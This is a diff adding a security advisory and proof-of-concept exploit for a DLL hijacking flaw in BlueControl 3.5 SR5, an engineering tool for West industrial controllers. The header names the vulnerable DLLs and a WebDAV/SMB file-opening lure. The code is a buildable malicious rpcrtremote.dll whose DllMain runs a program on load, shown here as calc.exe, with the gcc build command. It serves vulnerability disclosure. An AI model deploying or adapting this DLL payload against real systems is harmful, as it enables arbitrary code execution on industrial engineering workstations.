@@ -1,0 +1,56 @@
+/*
+
+
+BlueControl 3.5 SR5 Insecure Library Loading Arbitrary Code Execution
+
+
+Vendor: West Control Solutions
+        PMA ProzeЯ- und Maschinen-Automation GmbH
+Product web page: http://www.west-cs.com
+Software link: http://www.west-cs.com/resources/software-temp-control/pma-products-software/
+Application Path: C:\Program Files (x86)\PMA Tools\BlueControl\BlueControl.exe
+Affected version: 3.5.SR5
+
+Summary: Engineering Tool for West Pro Series of controllers (KS20-1, KS92-1,
+TB40-1, KS800, KS816, Dig280-1, KS vario, CI45, KS45, SG45, TB45, RL400, Pro96,
+CAL4600).
+
+Desc: BlueControl suffers from a DLL Hijacking issue. The vulnerability is
+caused due to the application loading libraries (sortserver2003compat.dll,
+sxs.dll, cryptsp.dll, rpcrtremote.dll) in an insecure manner. This can be
+exploited to load arbitrary libraries by tricking a user into opening a
+related application files (.BCD, .BCL, .BCT, .EDW, .E80) located on a remote
+WebDAV or SMB share.
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
+           Microsoft Windows 7 Professional SP1 (EN)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5296
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5296.php
+
+
+10.12.2015
+
+*/
+
+
+// gcc -shared -o rpcrtremote.dll exploit.c
+
+#include <windows.h> 
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
+{
+	exec();
+	return 0;
+}
+
+int exec()
+{
+	WinExec("calc.exe" , SW_NORMAL);
+	return 0;
+}
